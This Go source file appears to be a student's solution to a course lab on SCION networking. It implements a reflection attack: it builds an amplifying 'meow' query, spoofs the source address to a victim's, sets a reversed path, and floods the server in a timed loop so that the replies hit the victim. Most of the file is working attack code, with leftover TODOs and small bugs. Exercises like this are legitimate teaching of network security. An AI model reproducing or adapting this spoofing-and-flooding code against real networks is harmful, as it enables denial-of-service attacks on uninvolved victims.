package client

import (
	"context"
	"encoding/json"
	"fmt"
	"time"
	"net"

	// Unused imports are commented because Golang inhibits you from building the package
	// if any of these are around. 

	"student.ch/netsec/isl/attack/help"
	"student.ch/netsec/isl/attack/meow"

	// These imports were used to solve this task.
	// There are multiple ways of implementing the reflection. You can use
	// anything additional from the scion codebase and might not need all of
	// the listed imports below. But these should help you limit the scope and
	// can be a first starting point for you to get familiar with the options.
	"github.com/scionproto/scion/go/lib/addr"
	//"github.com/scionproto/scion/go/lib/common"
	//"github.com/scionproto/scion/go/lib/l4"
	"github.com/scionproto/scion/go/lib/sciond"
	"github.com/scionproto/scion/go/lib/snet"
	"github.com/scionproto/scion/go/lib/sock/reliable"
	//"github.com/scionproto/scion/go/lib/spath"
	//"github.com/scionproto/scion/go/lib/topology/overlay"
)

func GenerateAttackPayload() []byte {

	var q meow.Query = "0,"
	request := meow.NewRequest(q, meow.AddFlag("metadata"), meow.AddFlag("Verbose"), meow.AddFlag("Debug"))

	d, err := json.Marshal(request)
	if err != nil {
		fmt.Println(err)
		return make([]byte, 0) // empty paiload on fail
	}
	return d
}


// filterDuplicates filters paths with identical sequence of interfaces.
// These duplicates occur because sciond may return the same "effective" path with
// different short-cut "upstream" parts.
// We don't need these duplicates, they are identical for our purposes; we simply pick
// the one with latest expiry.
func filterDuplicates(paths []snet.Path) []snet.Path {

	chosenPath := make(map[snet.PathFingerprint]int)
	for i := range paths {
		fingerprint := paths[i].Fingerprint() // Fingerprint is a hash of p.Interfaces()
		e, dupe := chosenPath[fingerprint]
		if !dupe || paths[e].Expiry().Before(paths[i].Expiry()) {
			chosenPath[fingerprint] = i
		}
	}

	// filter, keep paths in input order:
	kept := make(map[int]struct{})
	for _, p := range chosenPath {
		kept[p] = struct{}{}
	}
	filtered := make([]snet.Path, 0, len(kept))
	for i := range paths {
		if _, ok := kept[i]; ok {
			filtered = append(filtered, paths[i])
		}
	}
	return filtered
}

// SetPath is a helper function to set the path on an snet.UDPAddr
func SetPath(addr *snet.UDPAddr, path snet.Path) {
	if path.Path() == nil {
		addr.Path = nil
		//addr.NextHop = nil
	} else {
		temp := path.Path()
		temp.Reverse()
		addr.Path = temp
		//addr.NextHop = path.OverlayNextHop()
	}
}


// serverAddr: The server IP addr and port in the form: ISD-IA,IP:port
// spoofed addr: The spoofed return address in the form: ISD-IA,IP:port
func Attack(ctx context.Context, serverAddr string, spoofedSrc string, payload []byte) (err error) {

	// The following objects might be useful and you may use them in your solution,
	// but you don't HAVE to use them to solve the task.

	// Parse the addresses from the given strings 
	meowServerAddr, err := snet.ParseUDPAddr(serverAddr)	//*snet.UDPaddr 
	if err != nil {
		return err
	}
	spoofedAddr, err := snet.ParseUDPAddr(spoofedSrc)	//*snet.UDPaddr 
	if err != nil {
		return err
	}


	//fmt.Println(meowServerAddr.NextHop)
	//maybe i dont need this since i already get the address
	
	meowServerAddr.NextHop = &net.UDPAddr{
		//IP:   ip,
		IP:   meowServerAddr.Host.IP,
		Port: 30041,
		Zone: "",
	}
	
	//fmt.Println(overlay.EndhostPort)

	// Context
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
	defer cancel()

	// Here we initialize handles to the scion daemon and dispatcher running in the namespaces
	
	// SCION dispatcher
	dispSockPath, err := help.ParseDispatcherSocketFromConfig()
	if err != nil {
		return err
	}
	dispatcher := reliable.NewDispatcher(dispSockPath)
	
	// SCION daemon
	sciondAddr, err := help.ParseSCIONDAddrFromConfig()
	if err != nil {
		return err
	}

	//fmt.Println(sciondAddr)
	sciondConn, err := sciond.NewService(sciondAddr).Connect(ctx)
	if err != nil {
		return err
	}
	
	//they provided this far
	//make the localIA be the victim's IA
	localIA := spoofedAddr.IA

	//create a path querier
	pathQuerier := sciond.Querier{Connector: sciondConn, IA: meowServerAddr.IA}

	//create a snet.network context
	network := snet.NewNetworkWithPR(
		localIA,
		dispatcher,
		pathQuerier,
		sciond.RevHandler{Connector: sciondConn},
	)

	//i think we can modify this into the snet.Network
	//defNetwork = Network{Network: network, IA: localIA, PathQuerier: pathQuerier, hostInLocalAS: hostInLocalAS}

	//query for the path from the victim IA (localIA) and the destination IA ie the one we are in
	paths, err := pathQuerier.Query(context.Background(), localIA)	//they had context.Background but maybe i should add ctxt itself?
	//fmt.Println("hello")
	//fmt.Println(paths)
	//filter duplicates
	paths = filterDuplicates(paths)
	if err != nil || len(paths) == 0 {
		return err
	}
	//chose first path out of the set of paths
	SetPath(meowServerAddr, paths[0]) //modified within the meowServerAddr the path is set within this method 


	//create connection from 
	conn, err := network.Dial(context.Background(), "udp", spoofedAddr.Host, meowServerAddr, addr.SvcNone)
	defer conn.Close()

	//fmt.Println(conn)


	// TODO: Set up a scion connection with the meow-server
	// and spoof the return address to reflect to the victim.
	// Don't forget to set the spoofed source port with your
	// personalized port to get feedback from the victims.

	// This is here to make the go-compiler happy
	fmt.Println(meowServerAddr.String())
	fmt.Println(spoofedAddr.String())

	//fmt.Println(conn.base.remote)

	for start := time.Now(); time.Since(start) < ATTACK_TIME; {
		conn.Write(payload)
	}
	return nil
}
